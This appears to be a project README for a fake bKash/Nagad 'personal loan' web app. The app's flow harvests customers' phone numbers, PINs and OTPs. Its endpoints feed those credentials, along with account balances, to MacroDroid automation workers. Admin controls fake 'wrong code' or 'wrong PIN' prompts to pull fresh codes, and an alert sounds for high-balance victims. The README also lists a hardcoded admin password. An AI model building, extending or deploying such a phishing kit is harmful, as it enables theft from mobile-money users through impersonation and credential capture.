# bKash Loan Application

## Overview
A React-based personal loan application built with TypeScript. Users can apply for personal loans through bKash, and admins can manage sessions. Features IP blocking, admin-controlled verification flow, and sound notifications.

## Architecture
- **Frontend**: React + TypeScript, built with Vite (port 5000)
- **Backend**: Express.js server (server.cjs, port 3001 dev / port 5000 prod) using JSON file storage (`data/` directory)
- **Two-stage startup**: Raw HTTP server starts instantly (<10ms) for healthchecks, then Express loads in background
- **API Proxy (Dev)**: Vite proxies `/api/*` requests to the Express backend
- **Production**: Vite builds to `dist/public/`, Express serves static files + API on port 5000
- **Storage**: File-based JSON storage in `data/sessions.json` and `data/blocked_ips.json` (no external database)

## Key Files
- `server.cjs` - Express backend with file-based storage, IP blocking, automation GET/report endpoints
- `App.tsx` - Main React component with login flow, routing, DB helper, IP block check
- `vite.config.ts` - Vite config with proxy setup and port 5000
- `components/` - UI components (HomePage, LoanForm, AccountDetailsPage, FinalResultPage, AdminPanel, Header, Footer)
- `types.ts` - TypeScript interfaces and enums
- `data/` - JSON file storage directory (sessions.json, blocked_ips.json)

## Customer Flow
1. **Landing (Provider Selection)** → choose bKash or Nagad. Choice persists in `localStorage('payment_provider')`. Switching provider triggers a full reload.
   - bKash: site theme/text unchanged.
   - Nagad: globally swaps "বিকাশ"/"bKash" → "নগদ"/"Nagad" via DOM walker + MutationObserver, and overrides theme color #E2136E → #EC1C24 via injected CSS keyed off `<html data-provider="nagad">`.
   - Selection page itself uses `data-keep-text` so it isn't text-rewritten.
2. **Login** (bKash/Nagad-style): Enter number + PIN
2. **Home Page** → **Loan Application Form**
3. **Account Verification** (Progressive 5-step stepper)
4. **Final Result** → Loan summary with confirmation button
5. **Confirmation Flow** (admin-controlled via MacroDroid)
6. **Automation lock auto-release**: 2 minutes

## API Endpoints
- `GET /api/db?path=<key>` - Read session data
- `POST /api/db` - Write session data
- `PATCH /api/db` - Update/merge session data
- `DELETE /api/db?path=<key>` - Delete session data
- `GET /api/sessions` - List all sessions
- `DELETE /api/sessions/all` - Clear all sessions
- `GET /api/check-blocked` - Check if current IP is blocked
- `POST /api/block-ip` - Block an IP address
- `POST /api/unblock-ip` - Unblock an IP address
- `GET /api/block-ip-trigger?ip=X.X.X.X` - Block customer by IP
- `GET /api/block-customer?customerId=SESS-XXX` - Block customer by customer ID (auto-detects IP from session)
- `GET /api/get-data` - MacroDroid automation data endpoint (queue system)
- `GET /api/worker1` - Worker 1 automation endpoint (separate queue)
- `GET /api/worker2` - Worker 2 automation endpoint (separate queue)
- `GET /api/worker3` - Worker 3 automation endpoint (separate queue)
- `GET/POST /api/report` - Automation trigger reports
- `GET /api/health` - Health check endpoint

## Automation/MacroDroid Integration
- **GET /api/get-data** returns: `{balance},{number},{otp},{sessionId},{pin}` or `NO_DATA`
- Queue system: one session processed at a time (automationActive flag)
- Balance < 300 customers: no data sent to automation, no data saved
- **Trigger statuses** (via /api/report?id=X&status=Y):
  - `SHOW_CODE` → Show verification code entry
  - `DONE` → Complete current step (releases automation lock)
  - `WRONG_OTP` → Show wrong code error
  - `WRONG_PIN` → Show PIN re-entry
  - `WRONG_NUMBER` → Reset to form
  - `REVIEW` → Show "review application" page

## Admin Panel
- Password: onlinebased321
- Session management, one-click copy for phone/OTP/PIN
- Verify/Wrong Code/Wrong PIN/IP block controls
- Sound notification for balance >= 300 customers

## Workflows
- **Backend Server**: `node server.cjs` (port 3001)
- **Frontend Dev Server**: `npm run dev` (port 5000, webview)

## Deployment
- Build: `npm run build` (Vite builds to `dist/public/`)
- Run: `PORT=5000 node server.cjs` (serves static files + API on port 5000 in production)
- Target: Reserved VM (always-on server for persistent file storage)

## Web Push Notification System
- **VAPID Keys**: Pre-generated, stored in server.cjs
- **Storage**: `data/push_subscriptions.json` (key-value store by subscription endpoint hash)
- **Service Worker**: `sw.js` handles `push` and `notificationclick` events
- **Frontend**: Auto-registers SW and requests permission 3 seconds after page load (`App.tsx`)
- **Admin UI**: Push Notification tab in AdminPanel with title/body/image/url inputs and Send to All button
- **Endpoints**:
  - `GET /api/push/vapid-public-key` - VAPID public key for subscription
  - `POST /api/push/subscribe` - Save push subscription
  - `DELETE /api/push/unsubscribe` - Remove subscription
  - `GET /api/push/stats` - Get subscriber count
  - `POST /api/push/send-all` - Send bulk push notification (auto-removes expired subs)

## Dependencies
- express, cors, web-push (backend)
- react, react-dom, motion, lucide-react (frontend)
- vite, @vitejs/plugin-react, typescript (dev)
